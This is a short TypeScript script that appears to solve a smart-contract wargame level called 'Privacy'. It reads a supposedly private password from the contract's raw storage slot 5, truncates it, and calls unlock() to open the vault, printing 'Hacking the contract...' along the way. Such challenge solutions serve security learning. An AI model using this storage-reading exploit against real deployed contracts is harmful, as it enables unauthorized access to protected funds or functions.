import { ethers } from "hardhat";
import { Privacy__factory } from '../typechain-types';
import { privateKey, rpc } from "../hardhat.config";

// Task: get value of private variable

const instanceAddress = ''

const main = async () =>  {
    let tx;
  
    const provider = new ethers.JsonRpcProvider(rpc);
    const signer = new ethers.Wallet(privateKey, provider);

    const contract = Privacy__factory.connect(instanceAddress, signer);

    console.log("Hacking the contract...");

    const password = await provider.getStorage(instanceAddress, 5)

    tx = await contract.connect(signer).unlock(password.slice(0, 34));
    await tx.wait();

    const locked = await contract.locked();

    console.log("Successfully hacked!");
    console.log("Vault is unlocked:", !locked);
}

main().catch((error) => {
    console.error(error);
    process.exitCode = 1;
});